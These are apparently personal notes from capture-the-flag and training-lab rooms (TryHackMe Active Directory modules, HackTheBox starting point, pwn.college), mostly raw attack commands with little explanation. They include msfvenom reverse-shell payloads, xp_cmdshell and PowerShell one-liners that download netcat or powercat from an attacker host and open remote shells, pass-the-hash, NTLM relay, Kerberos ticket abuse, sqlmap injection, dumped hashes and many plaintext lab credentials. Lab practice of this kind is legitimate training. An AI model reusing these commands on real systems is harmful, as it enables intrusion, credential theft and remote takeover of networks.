125/tcp  filtered locus-map
139/tcp  open     netbios-ssn    Microsoft Windows netbios-ssn
443/tcp  open     https?
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
445/tcp  open     microsoft-ds?
593/tcp  open     ncacn_http     Microsoft Windows RPC over HTTP 1.0
3389/tcp open     ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-24T07:45:50+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2024-04-23T07:33:39
|_Not valid after:  2024-10-23T07:33:39
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 5 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-24T07:45:53
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   217.22 ms 10.17.0.1
2   ... 4
5   350.68 ms 10.10.218.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 136.56 seconds

AD老子都没学，打个勾八，溜了。

## 绘图TMS

22/tcp  open  ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http Apache httpd 2.4.41 ((Ubuntu))
445/tcp open  microsoft-ds Apache httpd 2.4.41 ((Ubuntu))

/admin/: Possible admin folder

/admin                (Status: 301) [Size: 314] [--> http://10.10.238.247/admin/]
/shadow               (Status: 200) [Size: 25]
/passwd               (Status: 200) [Size: 25]

smb匿名帐户进不去


VHJ1c3QgbWUgaXQgaXMgbm90IHRoaXMgZWFzeS4ubm93IGdldCBiYWNrIHRvIGVudW1lcmF0aW9uIDpE:Trust me it is not this easy..now get back to enumeration :D

not this easy :D


### test
msfvenom -p cmd/unix/reverse_netcat lhost=10.11.72.135 lport=4444 R

msfvenom -p cmd/unix/reverse_netcat lhost=10.10.19.1 lport=4444 R


/home/cmnatic/suspicious-files/file1/ind3x.php

echo "10.129.136.129 inlanefreight.htb"

http GET port 80 request

http.request.method == "GET" && tcp.srcport == 80 

dns.qry.type == 1 && dns.flags.response == 1

Microsoft-IIS/6.0

http.server contains "IIS" matches "6.0"


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.222.225 LPORT=31337 -f exe -o shell.exe

## 破坏活动目录
systemd-resolve --interface breachad --set-dns 10.200.80.101 --set-domain za.tryhackme.com


[+] Valid credential pair found! Username: hollie.powell Password: Changeme123
[+] Valid credential pair found! Username: heather.smith Password: Changeme123
[+] Valid credential pair found! Username: gordon.stevens Password: Changeme123
georgina.edwards
Changeme123

1EzpEfXKCit18BlEHX8HfWP94ByOsXhij7yHQzb57VE=

nc=000
response=6ce20a5fea698604fc8190a45dc9677f,qop=auth,charset=utf-8


vBS3uTHFBKzCfayXj7rWt5DqyN

[SMB] NTLMv2-SSP Client   : ::ffff:10.200.80.202
[SMB] NTLMv2-SSP Username : ZA\svcFileCopy
[SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:6123c6d1746ce4e2:6F35EFF5EF5F2E5A7C657E53688A5B15:010100000000000000E44FDA4B9CDA01F890BF7E79E953B400000000020008003200480053004B0001001E00570049004E002D005A00560046004F00590057005600370038004500340004003400570049004E002D005A00560046004F0059005700560037003800450034002E003200480053004B002E004C004F00430041004C00030014003200480053004B002E004C004F00430041004C00050014003200480053004B002E004C004F00430041004C000700080000E44FDA4B9CDA0106000400020000000800300030000000000000000000000000200000F36C17CB536C16B0B0CE91A7C0E9E8D3C051A8491BFCE9E927840484D5153F560A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00370039002E0033000000000000000000

svcFileCopy
FPassword1!

x64{4A80F545-684D-4F78-BEF0-B99CD82D397D}.bcd

tftp -i 10.200.80.202 GET "\Boot\x64\Images\LiteTouchPE
_x64.wim" pxeboot.wim

svcMDT

PXEBootSecure1@

za.tryhackme.com
svcAV
jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==

MyStrongPassword!


## C2框架

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.211.173 LPORT=31337 -f exe -o shell.exe


## HTB-start-point

820b69799c6031b6:99168B3E4FCA5D9CEE40D1359B4C297F:01010000000000000069C30D479DDA015B5DCF74DE46F2CA00000000020008004A00410051004F0001001E00570049004E002D004B004C004E00500039005A005700520045004C00530004003400570049004E002D004B004C004E00500039005A005700520045004C0053002E004A00410051004F002E004C004F00430041004C00030014004A00410051004F002E004C004F00430041004C00050014004A00410051004F002E004C004F00430041004C00070008000069C30D479DDA0106000400020000000800300030000000000000000100000000200000C8D573977AFEAFE82D42914F7909A80C780C604B1808739B645DAC39055D297C0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00360035000000000000000000 

Administrator
badminton

## 武器化


echo "Set shell = WScript.CreateObject("Wscript.Shell")
shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True" > hello1.vbs

## 春秋云镜

Cookie
	PHPSESSID=qno4qsckrii3rf2ma0modbouot

User-Agent
	Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

sqlmap -u "http://eci-2ze4xms0fux1mzyz55il.cloudeci1.ichunqiu.com/welcome.php?q=quiz&step=2&eid=60377db362694&n=1&t=34" -p "eid" --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0" --cookie="PHPSESSID=qno4qsckrii3rf2ma0modbouot" --batch --dbs

### 枚举AD

systemd-resolve --interface enumad --set-dns 10.200.76.101 --set-domain za.tryhackme.com

Username: graeme.williams 
Password: hJnlKuLBa2


ssh za.tryhackme.com\\graeme.williams@thmjmp1.za.tryhackme.com

$dnsip = "10.200.76.101"
$index = Get-NetAdapter -Name 'Ethernet' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip

xfreerdp /u:JohnDoe /p:hJnlKuLBa2  /v:10.200.76.248:22


xfreerdp /u:za.tryhackme.com\graeme.williams /p:hJnlKuLBa2 /v:za.tryhackme.com


## 故障

http://10.10.202.103/api/access
token	"dGhpc19pc19ub3RfcmVhbA=="

this_is_not_real

看了WP，需要知道改请求（这个倒是知道），后面要用wfuzz反复测试，还要用到命令执行，拿到shell，提权也挺麻烦，先搁置

## yara
file1
5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad  ind3x.php

file2

53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf  1ndex.php

## 枚举AD

systemd-resolve --interface enumad --set-dns 10.200.76.101 --set-domain za.tryhackme.com

ssh za.tryhackme.com\\charlotte.wilson@thmjmp1.za.tryhackme.com

key:
Username: charlotte.wilson 
Password: Password!

runas.exe /netonly /user:<domain>\<username> cmd.exe

runas.exe /netonly /user:charlotte.wilson\Password! cmd.exe

$dnsip = "10.200.76.101"
$index = Get-NetAdapter -Name '10.50.103.231' | Select-Object -ExpandProperty 'ifIndex'
Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip

xfreerdp /u:charlotte.wilson /p:Password! /v:10.200.76.248


Get-ADUser -Identity beth.nolan -Server za.tryhackme.com -Properties *


Get-ADUser -Identity annette.manning -Server za.tryhackme.com -Properties *
annette.manning

CN=annette.manning,OU=Marketing,OU=People,DC=za,DC=tryhackme,DC=com

Get-ADGroupMember -Identity "Tier 1 Admins" -Server za.tryhackme.com

Get-ADGroup -Identity "Enterprise Admins" -Server za.tryhackme.com -Properties *

scp charlotte.wilson@THMJMP1.za.tryhackme.com:C:/Users/charlotte.wilson/Documents/20240509114539_BloodHound.zip .
scp <AD Username>@THMJMP1.za.tryhackme.com:C:/Users/<AD Username>/Documents/<Sharphound ZIP> .

sharphound.exe --CollectionMethods All --Domain za.tryhackme.com --ExcludeDCs

scp charlotte.wilson@THMJMP1.za.tryhackme.com:C:/Users/charlotte.wilson/Documents/ .

CHALOTTE.SILSON@THMJMP1.ZA.TRYHACKME.COM

## pwn.collage

a980d99281a28d638ac68b9bf9453c2b

pwn.college{4_zz44kS-9po   G   N   Z   k   n   m   D   E7   _   h   c   d   K   7   .   0   1   M   1   E   D   L   2Q   T   N   0   U   z   W   }  \n

pwn.college{kY0Jp0BQUgLSOn_-PYNLc929XQ-.0FN1EDL2QTN0UzW}

pwn.college{UXR_j0_UXLUio7ZxNHsNT6qb07Z.0VN1EDL2QTN0UzW}

OB3W4LTDN5WGYZLHMV5W6SRYJVUDATTZMNEWG5RXPFEEIYTDNZME2S2EJZRHSWJOGBWE4MKFIRGDEUKUJYYFK6SXPUFA====

import gzip
with gzip.open('flag.gz', 'rb') as f:
     for line in f:
         print(line)

## start-point-htb

Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc

ARCHETYPE\sql_svc:M3g4c0rp123@10.129.108.186

python3 mssqlclient.py ARCHETYPE\sql_svc@10.129.213.179 -windows-auth

python3 mssqlclient.py ARCHETYPE/sql_svc@10.129.137.250 -windows-auth


EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; - Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;wget http://10.10.15.53:8000/nc65.exe -outfile nc64.exe"

xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads;.\nc64.exe -e cmd.exe 10.10.15.53 443"


## pwn.collage

LFILE=/flag
TF=$(mktemp -u)
zip $TF $LFILE
unzip -p $TF

LFILE=/flag
tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'

TF=$(mktemp -u)
LFILE=/flag
ar r "$TF" "$LFILE"
cat "$TF"

LFILE=/flag
genisoimage -q -o - "$LFILE"

genisoimage -q -o - "/flag"

sudo install -m =xs $(which genisoimage) .

LFILE=/flag
./genisoimage -sort "$LFILE"

LFILE=/flag
whiptail --textbox --scrolltext "$LFILE" 0 0

sed -i 's@^\(deb.*stable main\)$@#\1\ndeb https://mirrors.tuna.tsinghua.edu.cn/termux/termux-packages-24 stable main@' $PREFIX/etc/apt/sources.list


## 横向移动与旋转

systemd-resolve --interface lateralmovement --set-dns 10.200.48.101 --set-domain za.tryhackme.com


凭证
Username: leon.jennings 
Password: Password!

ssh za\\leon.jennings@thmjmp2.za.tryhackme.com

msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.210 LPORT=4444 -o mypayload.exe

smbclient -c 'put mypayload.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.210 4443"

用户：ZA.TRYHACKME.COM\t1_leonard.summers
密码：EZpass4eve

msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=10.50.46.210 LPORT=4444 -o myservice.exe

smbclient -c 'put mypayload.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever

runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe 10.50.46.210 4443"

sc.exe \\thmiis.za.tryhackme.com create THMservice-8848 binPath= "%windir%\mypayload.exe" start= auto

C:\Users\t1_leonard.summers\Desktop\Flag.exe

C:\Users\t1_corine.waters\Desktop\Flag.exe

C:\Users\t1_toby.beck\Desktop\Flag.exe

User: ZA.TRYHACKME.COM\t1_corine.waters

Password: Korine.1994

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.46.210 LPORT=4445 -f msi > mypayload.msi

smbclient -c 'put mypayload.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994


Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\mypayload.msi"; Options = ""; AllUsers = $false}

用户：ZA.TRYHACKME.COM\t2_felicia.dean

密码：iLov3THM!

 [00000003] Primary                                                               
  Username : t1_toby.beck4                                                       
  Domain  ZA                                                                  
  NTLM    533f1bd576caa912bdb9da284bbc60fe                                    
  SHA1    8a65216442debb62a3258eea4fbcbadea40ccc38                            
  DPAPI   47d511de8e208dc0053e88223dcdd31c   

Domain : THMJMP2                                                                          
SysKey : 2e27b23479e1fb1161a839f9800119eb 

sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:533f1bd576caa912bdb9da284bbc60fe /run:"c:\tools\nc64.exe -e cmd.exe 10.50.46.210 5555"

winrs.exe -r:thmiis.za.tryhackme.com cmd

Username: leon.jennings 
Password: Password!

Username: t2_abigail.cox Password: Vivian2008

xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_abigail.cox /p:Vivian2008

tscon 5 /dest:rdp-tcp#6

Your credentials have been generated: Username: tony.holland Password: Mhvn2334
ssh za\\tony.holland@thmjmp2.za.tryhackme.com

ssh root@10.50.46.210 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N

ssh tunneluser@10.50.46.210 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N

ssh tunneluser@10.50.46.210 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N



socat TCP4-LISTEN:13389,fork TCP4:THMIIS.za.tryhackme.com:6789

e been generated: Username: rachael.atkinson Password: Zjqf3489

ssh za\\rachael.atkinson@thmjmp2.za.tryhackme.com

a5a4720990d00ef4

systemd-resolve --interface lateralmovement --set-dns 10.200.48.101 --set-domain za.tryhackme.com

useradd tunneluser -m -d /home/tunneluser -s /bin/true
passwd tunneluser

ssh za\\bradley.cook@thmjmp2.za.tryhackme.com

 Your credentials have been generated: Username: bradley.cook Password: Onsl4845 

ssh tunneluser@10.50.46.210 -R 8888:thmdc.za.tryhackme.com:80 -L *:6666:127.0.0.1:6666 -L *:7878:127.0.0.1:7878 -N

## 利用AD

systemd-resolve --interface exploitad --set-dns 10.200.120.101 --set-domain za.tryhackme.loc

Your credentials have been generated: Username: alice.howard Password: Dayton1993

ssh za.tryhackme.loc\\alice.howard@thmwrk1.za.tryhackme.loc

Add-ADGroupMember "IT Support" -Members "alice.howard"

$Password = ConvertTo-SecureString "password" -AsPlainText -Force 

t2_melanie.davies

Set-ADAccountPassword -Identity "" -Reset -NewPassword $Password 
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password 

$Password = ConvertTo-SecureString "password" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password 

t2_henry.harvey

Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password

ssh za.tryhackme.loc\\donald.ross@thmwrk1.za.tryhackme.loc

Your credentials have been generated: 
Username: donald.ross 
Password: Changeme123

Add-ADGroupMember "IT Support" -Members "donald.ross"

t2_melanie.davies

$Password = ConvertTo-SecureString "password" -AsPlainText -Force

Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword "password"

Set-ADAccountPassword -Identity "AD.Account.Username.Of.Target" -Reset -NewPassword $Password 


$t2admin = Get-ADGroupMember -Identity 'Tier 2 Admins' | Get-Random -Count 1
$t2admin.Name
$password = 'strong.pass1' | ConvertTo-SecureString -AsPlainText -Force
Set-ADAccountPassword -Identity $t2admin -Reset -NewPassword $password

t2_melanie.davies

$Password = ConvertTo-SecureString "password" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password

t2_caroline.dawson

Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:donald.ross /p:Changeme123

$Password = ConvertTo-SecureString "admin" -AsPlainText -Force
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password

ssh za.tryhackme.loc\\t2_melanie.davies@thmwrk1.za.tryhackme.loc



ssh za.tryhackme.loc\\t2_ross.bird@thmwrk1.za.tryhackme.loc

tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
[thmserver1.za.tryhackme.loc]: 
PS C:\Users\t1_trevor.jones\Documents> whoami
za\t1_trevor.jones

kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

kerberos:: ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc

python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.120.201" -debug

python3.9 ntlmrelayx.py -smb2support -t smb://"10.200.120.201" -c 'whoami /all' -debug

python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.120.201" -debug

python3.9 ntlmrelayx.py -smb2support -t smb://"10.200.120.201" -c 'whoami /all' -debug

python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.120.201" -debug

Your credentials have been generated: 
Username: frances.armstrong 
Password: Offering2008

ssh za.tryhackme.loc\\frances.armstrong@thmwrk1.za.tryhackme.loc

Add-ADGroupMember "IT Support" -Members "frances.armstrong"

$Password = ConvertTo-SecureString "Admin@login123" -AsPlainText -Force 
Set-ADAccountPassword -Identity "t2_melanie.davies" -Reset -NewPassword $Password

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:frances.armstrong /p:Offering2008

ssh za.tryhackme.loc\\t2_ross.bird@thmwrk1.za.tryhackme.loc

python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://10.200.120.201 -debug

SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.117.162"

SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.10.138.58"

python3.9 ntlmrelayx.py -smb2support -t smb://10.200.120.201 -c 'whoami /all' -debug

python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug

[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:8c3efc486704d2ee71eebe71af14d86c:::
[+] NewStyle hashes is: True
FluffyBunny:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Done dumping SAM hashes for host: 10.200.120.201
[*] Stopping service RemoteRegistry


python3.9 ntlmrelayx.py -smb2support -t smb://10.200.120.201 -c 'whoami /all' -debug

trevor.local

31d6cfe0d16ae931b73c59d7e0c089c0:
8c3efc486704d2ee71eebe71af14d86c:Password1234

ssh za.tryhackme.loc\\trevor.local@thmserver2.za.tryhackme.loc

emerald

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.117.162 LPORT=4444 -f psh -o shell.ps1


sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.117.162; set LPORT "4444'; exploit"

evil-winrm -i 10.200.120.201 -u trevor.local -H 8c3efc486704d2ee71eebe71af14d86c

certutil.exe -urlcache -split -f http://10.50.117.162/shell.ps1

Invoke-WebRequest -Uri http://10.50.117.162/shell.ps1 -OutFile C:\shell.ps1



Imreallysurenoonewillguessmypassword

runas /netonly /user:za.tryhackme.loc\trevor.local cmd.exe

runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe

xfreerdp /v:thmwrk1.za.tryhackme.loc /u: /p:Offering2008
xfreerdp /v:thmwrk1.za.tryhackme.loc/u:t2_ross.bird /p:Admin@login123

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.17.59.71 LPORT=443 -f vba

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.17.59.71:8080/powercat.ps1');powercat -c 10.17.59.71 -p 1337 -e cmd"

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.17.59.71 LPORT=443 -f hta-psh -o thm.hta

http://10.17.59.71:8080/htm.hta

Your credentials have been generated: Username: jamie.davis Password: Hypr3102

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:jamie.davis /p:Hypr3102

ssh za.tryhackme.loc\\jamie.davis@thmserver2.za.tryhackme.loc

Add-ADGroupMember "IT Support" -Members "jamie.davis"

ssh za.tryhackme.loc\\jamie.davis@thmwrk1.za.tryhackme.loc

Add-ADGroupMember "IT Support" -Members "jamie.davis"

$Password = ConvertTo-SecureString "Admin@login123" -AsPlainText -Force 

Set-ADAccountPassword -Identity "t2_ross.bird" -Reset -NewPassword $Password 

ssh za.tryhackme.loc\\t2_ross.bird@thmwrk1.za.tryhackme.loc


runas /netonly /user:za.tryhackme.loc\t2_ross.bird cmd.exe

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_ross.bird /p:Admin@login123

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:jamie.davis /p:Hypr3102

ssh za.tryhackme.loc\\paula.bailey@thmwrk1.za.tryhackme.loc

Your credentials have been generated: Username: paula.bailey Password: Y2VgRWWiQ

Add-ADGroupMember "IT Support" -Members "paula.bailey"

runas /netonly /user:za.tryhackme.loc\t2_ross.bird cmd.exe

xfreerdp /v:thmwrk1.za.tryhackme.loc /u:paula.bailey /p:Y2VgRWWiQ

Username: svcServMan
Password: Sup3rStr0ngPass!@

ssh za.tryhackme.loc\\svcServMan@thmserver2.za.tryhackme.loc

xfreerdp /v:thmserver1.za.tryhackme.loc /u:svcServMan /p:Sup3rStr0ngPass!@

ssh za.tryhackme.loc\\paula.bailey@thmserver2.za.tryhackme.loc

Username: jamie.davis Password: Hypr3102

xfreerdp /v:thmserver2.za.tryhackme.loc /u:paula.bailey /p:Y2VgRWWiQ

.\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Users\paula.bailey\Desktop\cert.pfx /password:password /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:12.31.1.101

``````
任务2->任务6->任务7

任务六：
普通用户->svcServMan->thmserver2
任务七：
thmserver2->thmdc

Username: svcServMan
Password: Sup3rStr0ngPass!@

``````

ssh za.tryhackme.loc\\paula.bailey@thmserver2.za.tryhackme.loc
xfreerdp /v:thmserver2.za.tryhackme.loc /u:paula.bailey /p:Y2VgRWWiQ

systemd-resolve --interface exploitad --set-dns 10.200.35.101 --set-domain za.tryhackme.loc

ssh za.tryhackme.loc\\sarah.hilton@thmwrk1.za.tryhackme.loc

Your credentials have been generated: 
Username: sarah.hilton 
Password: Newcastle1988



